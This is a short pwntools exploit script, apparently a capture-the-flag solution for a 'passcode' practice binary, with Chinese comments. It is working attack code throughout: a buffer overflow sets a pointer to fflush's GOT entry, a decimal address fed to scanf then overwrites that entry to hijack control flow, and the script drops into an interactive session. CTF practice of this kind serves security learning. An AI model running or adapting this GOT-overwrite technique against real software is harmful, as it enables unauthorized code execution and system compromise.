from pwn import *

context.binary = elf = ELF('/home/passcode/passcode')

FFLUSH_GOT = elf.got['fflush']
JUMP       = 0x080492a1             # 推薦用這個入口

p = process()               # or: p = remote('0', 9000)

payload1 = b"A"*96 + p32(FFLUSH_GOT)   # 讓 passcode1 = &GOT[fflush]
p.recvuntil(b"enter you name : ")
p.sendline(payload1)                   # 第一次輸入：name
p.recvuntil(b"enter passcode1 : ")
p.sendline(str(JUMP).encode())         # 第二次輸入：十進位地址給 %d


p.interactive()